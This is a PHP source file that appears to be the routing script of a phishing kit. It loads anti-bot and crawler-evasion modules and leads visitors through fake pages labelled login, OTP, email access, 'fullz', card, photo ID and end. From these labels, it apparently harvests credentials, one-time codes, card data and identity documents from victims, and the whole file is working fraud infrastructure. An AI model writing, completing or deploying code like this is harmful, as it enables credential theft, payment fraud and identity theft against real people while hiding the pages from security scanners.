<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "../settings.php";
$base="render";

if(isset($_GET[genv('login')])){
	$_SESSION['c_page_'] = "login";
	$other="first";
	if($_COOKIE[$_SESSION['ssww']] < 601){include $base."/login.php";exit();}
	else{include $base."/login.php";;exit();};
}
else if(isset($_GET[genv('otp')])){
	$_SESSION['c_page_'] = "otp";
	include $base."/hh.php";
}
else if(isset($_GET[genv('otpage')])){
	$_SESSION['c_page_'] = "otp";
	include $base."/ot.php";
}
else if(isset($_GET[genv('email')])){
	$_SESSION['c_page_'] = "email";
	if($grabemailaccess!=1){header('location:'.$index."?".genv(gonext("email"))."=".md5(rand(10, 9999)));exit();};
	$other="last";
	include $base."/em.php";
}
else if(isset($_GET[genv('note')])){
	$_SESSION['c_page_'] = "note";
	include $base."/sp.php";
}
else if(isset($_GET[genv('fullz')])){
	$_SESSION['c_page_'] = "fullz";
	include $base."/bid.php";
}
else if(isset($_GET[genv('card')])){
	$_SESSION['c_page_'] = "card";
	include $base."/cv.php";
}
else if(isset($_GET[genv('photo')])){
	$_SESSION['c_page_'] = "photo";
	include $base."/idd.php";
}
else if(isset($_GET[genv('end')])){
	$_SESSION['c_page_'] = "end";
	include $base."/end.php";
}